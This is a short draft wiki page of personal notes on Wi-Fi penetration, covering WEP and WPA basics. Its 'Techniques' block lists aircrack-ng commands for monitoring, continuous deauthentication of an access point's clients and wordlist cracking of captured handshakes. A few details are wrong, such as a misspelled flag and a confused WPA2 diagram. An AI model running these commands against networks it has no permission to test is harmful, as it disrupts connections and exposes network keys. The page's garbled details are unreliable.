---
title: Wifi Penetration
date: '2016-11-30T02:00:02+04:00'
lastmod: '2016-12-13T20:51:13+04:00'
original_id: '{A527}'
original_name: wifipenetration
original_blob: blob/B/5/247.txt
revisions: 12
author: admin
last_editor: admin
tags:
- computing
categories:
- computing
wikislug: wifipenetration
draft: true
review: update
topics:
- security
---

[Read This!](caveatemptor.md) |
  [Picolisp](picolisp.md) |
  [Picolisp Machine](pilmachine.md) |
  [Pil Sources](pilsource.md) |
  [Linux](linux.md) | [BASH](bash.md) |
  [C-Programmming](cprogramming.md) | [Javascipt](javascript.md) | [Python](python.md) |
  [Operating Systems](os.md) |
  [Computer Security](computersecurity.md) |
  [Firewalls](firewalls.md) |
  [Exploitation](exploitation.md) |
  [Social Engineering](internetexploitation.md) |
  [Metasploit](metasploit.md) |
  [Emacs](emacs.md) | [vim](vim.md) |
  [Pharo Smalltalk](pharo.md) | [wifi-penetration](wifipenetration.md)

# Wifi Penetration

The [Wifi-Alliance](http://www.wi-fi.org/) is the worldwide network of companies that brings you Wi-Fi!

## Protocols

- wep - Wired Equivalent Privacy
  ```
      Initialization Vector Packet - are clear text and encrypt the next 3 data packets
         IV ---------> | Access Point | ~~~~~~~~~~~~~~~~~~~~~~~~~~[Victim]
       Packet                            Air Crack
       64-Bit                          50k packets -IV ---> Key
  password  Random                      Cracked in 10-15mins
  ```
- WPA - Wifi Protected Access
- WPA2 -Wifi Protected Access 2
  ```
       Authentication Header - AES Encrypted (symmetric)
            [AH]
          /     \
       [AP]      [V]
           \    /
            [H]
  ```

## Techniques

- Option 1 
  ```
   airmon-ng start wlan0
   airodump-ng mon0
   airodump-ng -c #channelid -w filename --bbsid #(mac address of client) mon0
   aireplay-ng -0 0 -a #BSSID mon0
   aircrack-ng file -w /pentest/passwords/wordlist/darkcode.lst
  ```

## Tools, Sources and Links

- [Wireless Shack](http://www.wirelesshack.org/)
- [Fluxion](https://github.com/deltaxflux/fluxion)
